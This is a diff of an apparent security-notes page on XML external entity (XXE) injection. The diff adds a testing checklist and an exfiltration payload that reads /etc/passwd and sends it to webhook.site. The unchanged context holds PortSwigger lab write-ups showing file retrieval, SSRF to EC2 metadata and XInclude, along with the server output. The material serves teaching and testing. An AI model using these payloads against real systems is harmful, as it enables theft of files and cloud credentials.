@@ -39,7 +39,8 @@ xml:
 ### Checklist
 <details markdown="1">
   <summary>Click me to expand checklist</summary>  
-  Objective  
+
+  #### Objective  
   1. **Identify endpoints that can process XML**  
       * Send test requests with XML payloads and set Content-Type to `application/xml` or `text/xml`.  
       * Inspect response content: `Content-Type: application/xml` or `Content-Type: text/xml` as accepted request headers.  
@@ -50,7 +51,7 @@ xml:
 
   3. **Test identified endpoints for XXE**  
 
-Attack surface discovery  
+  #### Attack surface discovery  
   1. **Identify endpoints that accept XML payloads**  
       * Review requests in proxy for XML data (e.g., Burp Suite)  
       * Identify endpoints that accept JSON by sending XML  
@@ -58,21 +59,66 @@ Attack surface discovery
       * Identify endpoints that accept documents by sending DOCX or PDF files  
 
   2. **Test with the header Content-Type: application/xml**  
-
   3. **Verify working XML payloads that can be adapted to deliver exploits**  
       * Confirm the endpoint accepts and processes XML  
       * Inject harmless modifications to observe behavior changes  
 
-  5. **Locate internal DTDs**  
+  4. **Locate internal DTDs**  
       * <!DOCTYPE ...> that contains `[internal subset]`, `[internal declaring elements]`, `[internal declaring entities]`, or `[attribute rules]`  
-Testing
+  
+  #### Testing
+  
+  1. **Test for external entities with a simple non-malicious payload**  
+      * <!ENTITY harmless SYSTEM "http://example.com/">  
+      * If the server processes external entities, it will fetch the contents from example.com  
 
+  2. **Test for external entities with an available file**  
+      * <!ENTITY password SYSTEM "file:///etc/passwd">  
 
+  3. **Test for external entities with an available endpoint we control**  
+      * [Webhook](https://webhook.site/)  
 
+  4. **Test for external entities with other available endpoints**  
+      * <!ENTITY ext SYSTEM "http://internal-api.local/admin">  
+
+  5. **EC2 metadata endpoint http://169.254.169.254/latest/meta-data**  
+      * [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)  
+
+  6. **Test filters and restrictions**  
+      * Send common disallowed characters or keywords (e.g., `<`, `<!DOCTYPE>`, `$`, `SYSTEM`, `ENTITY`)  
+      * Bypass filters using encoding or obfuscation (e.g., URL encoding, Unicode encoding, base64 encoding, null byte insertion, or alternate whitespace characters)  
+      * Trigger error messages to exfiltrate information (e.g., `<!DOCT`)  
+      * Nested Parameter Entities with External Payload (e.g., <!ENTITY external_dtd SYSTEM "http://example.com/payload.dtd">)  
+      * Splitting Payload Across Multiple Parameters  
+
+  7. **Test for denial of service  
+      * [Billion laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack)  
+
+  8. **Test for code execution
+      * Tag Injection
+  
+  #### Impact
+  1. **Can we read sensitive files?**  
+      * Configuration files (e.g., `/etc/passwd`)  
+      * System files (e.g., `/etc/shadow`)  
+      * SQLite files  
+      * SSH keys (e.g., `~/.ssh/id_rsa`)  
+
+  2. **Can we exfiltrate sensitive information?**
+      * <?xml version="1.0" encoding="UTF-8"?>  
+        <!DOCTYPE foo [  
+          <!ENTITY xxe SYSTEM "file:///etc/passwd">  
+          <!ENTITY % remote SYSTEM "https://webhook.site/?data=%xxe;">  
+          %remote;  
+        ]>  
+        <foo>&xxe;</foo>  
+  3. **Can we achieve code execution?**  
+  
+</details>
 
 ### Labs
-Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection) to show how this vulnerability can lead to:
-#### Exploiting XXE using external entities to retrieve files  
+Just for demostration, I completed a few labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection) to show how this vulnerability can lead to:
+#### 1. Exploiting XXE using external entities to retrieve files  
 I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!DOCTYPE element` that defines an external entity containing the path to the file `etc/passwd`.
    ~~~
    <?xml version="1.0" encoding="UTF-8"?>  
@@ -94,7 +140,7 @@ I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!D
    > dnsmasq:x:101:65534 :dnsmasq, ,,:/var/lib/misc:/usr/sbin/nologin  
    > messagebus:x:102:101 :: /nonexistent:/usr/sbin/nologin
    
-#### Exploiting XXE to perform SSRF attacks  
+#### 2. Exploiting XXE to perform SSRF attacks  
 I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!DOCTYPE element` that defines an external entity `test` to access EC2 instance metadata. More details about what _EC2 instance metadata_ is, visit [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
    ~~~
    < ?xml version="1.0" encoding="UTF-8"?>  
@@ -148,7 +194,7 @@ I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!D
 {: .box-note}
 **Note:** 💡SSRF exploits a server's request-making functionality, allowing user to make a crafted request that pivots from the public-facing application and uses the server's trusted internal network position to scan, access, and exfiltrate data from otherwise unreachable backend services and cloud metadata endpoints.
 
-#### Exploiting XInclude to retrieve files  
+#### 3. Exploiting XInclude to retrieve files  
    I identified the server-side xml parser by studying `GET /product?productId=3` on Burp Proxy. Insert the `Xinclude namespace` and the filepath to `POST /product/stock` on Repeater.
    ~~~
    productId=<test  
@@ -176,3 +222,6 @@ I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!D
 2. Use JSON instead of XML
 3. Validate and Sanitize XML Input (with XSD)
 4. Restrict Network/File Access (OS or Container Level)
+
+### Also Read
+[WSTG - Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
